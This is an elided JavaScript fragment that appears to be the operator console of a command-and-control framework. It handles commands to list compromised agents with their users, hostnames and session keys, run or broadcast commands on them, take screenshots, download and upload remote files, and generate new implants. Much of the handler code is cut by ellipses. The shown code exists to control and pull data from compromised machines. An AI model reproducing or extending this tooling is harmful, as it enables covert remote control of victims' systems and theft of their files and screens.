    ...
    try {
        switch (cmd) {
            case "kill": {
                ...
                if (!id) { Log("[!] Usage: kill <id>", "error"); break; }
            ...
            case "sessions": case "agents": {
                let d = await (await Api("/api/agents")).json();
                if (!(d.Agents || []).length) { Log("  ⚠ No active sessions"); break; }
                (d.Agents || []).forEach(a => Log(
                    "  #" + a.ID + "  " + (a.DisplayName || a.AgentName || "?") + "  " +
                    a.Type + "  " + a.User + "@" + a.Hostname + "  " + a.OS +
                    "  key=" + (a.SessionKey || "—")
                ));
                break;
            }
            ...
            case "exec": {
                ...
                if (!id || !execCmd) { Log("[!] Usage: exec <id> <cmd>", "error"); break; }
            ...
            case "broadcast": {
                ...
                if (!rawFull) { Log("[!] Usage: broadcast <all|id1,id2,...> <cmd>", "error"); break; }
                let tgt = parts[1] || "";
                let bcmd = parts.slice(2).join(" ");
                if (!bcmd) { Log("[!] Usage: broadcast <all|ids> <cmd>", "error"); break; }
                let endpoint = tgt.toLowerCase() === "all" ? "/api/command/broadcastall" : "/api/command/broadcast";
                let body = tgt.toLowerCase() === "all"
                    ? { Command: bcmd, Operator: State.operator || "system" }
                    : { AgentIds: tgt.split(",").map(Number), Command: bcmd, Operator: State.operator || "system" };
                let d = await (await Api(endpoint, { method: "POST", body: JSON.stringify(body) })).json();
                Object.entries(d.Results || {}).forEach(([id, v]) =>
                    Log("  [" + id + "] " + (v.Success ? "✔ " : "✘ ") + (v.Output || ""), v.Success ? "success" : "error")
                );
                break;
            }
            case "screenshot": {
                let id = parseInt(parts[1]) || State.selectedId;
                if (!id) { Log("[!] Usage: screenshot <id>", "error"); break; }
            ...
            case "download": case "dl": {
                ...
                if (!id || !path) { Log("[!] Usage: download <id> <remote-path>", "error"); break; }
            ...
            case "upload": {
                ...
                let local = parts[2] || "";
                let remote = parts[3] || "";
                if (!id || !local) { Log("[!] Usage: upload <id> <local-path> [remote-path]", "error"); break; }
            ...
            case "listopt": case "operators": {
                let d = await (await Api("/api/team/operators")).json();
                (d.Operators || []).forEach(op =>
                    Log("  " + op.Username.padEnd(16) + "  " + (op.Role || "?").padEnd(10) + "  " + (op.LastSeen || "Never"))
                );
                break;
            }
            case "history": {
                ...
                (d.History || []).forEach(h =>
                    Log("  [" + (h.Timestamp || "") + "] #" + h.AgentId + " " + (h.Operator || "?") + " » " + h.Command)
                );
                break;
            }
            case "chathistory": {
                ...
                (d.Chat || []).forEach(m =>
                    Log("  [" + (m.timestamp || "") + "] " + m.from_operator + " → " + (m.to_operators || "all") + ": " + m.message)
                );
                break;
            }
            case "agentgen": case "genagent": {
            ...
            case "help": {
                ...
                ["sessions/agents", "exec <id> <cmd>", "broadcast <all|ids> <cmd>",
                    "kill <id>", "screenshot <id>", "download <id> <path>",
                    "upload <id> <local> [remote]", "status", "history [id] [limit]",
                    "listopt", "chathistory", "agentgen <id> [host] [port] [lang] [mtls]",
                    "logs", "help"].forEach(c => Log("    " + c));
                break;
            }
            default:
